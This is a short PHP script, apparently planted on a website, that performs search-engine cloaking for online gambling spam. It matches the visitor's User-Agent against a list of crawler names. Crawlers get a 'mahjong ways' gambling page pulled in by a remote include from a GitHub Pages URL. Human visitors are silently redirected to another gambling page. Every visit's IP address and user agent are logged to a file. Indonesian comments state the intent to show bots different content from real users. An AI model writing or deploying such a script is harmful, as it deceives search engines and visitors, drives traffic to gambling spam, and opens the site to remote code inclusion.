<?php
function isBot() {
    $bots = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver'
    ];

    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

    foreach ($bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function logVisitor($note = '') {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $date = date("Y-m-d H:i:s");

    $log = "[$date] IP: $ip | UA: $userAgent | $note\n";
    file_put_contents("log.txt", $log, FILE_APPEND);
}

if (isBot()) {
    // Logging bot visit
    logVisitor("Bot detected");

    // Tampilkan konten untuk bot dari file HTML
    include('https://saklawase.github.io/kabeh/kontroversi-akun-vvip-mahjong-ways-telah-terungkap.html');
} else {
    // Logging human visit
    logVisitor("Human visitor");

    // Redirect user asli ke halaman lain
    header("Location: https://zmukzo.github.io/curve/00017-pesta-scatter-mahjong-wins-3.html");
    exit;
}
?>
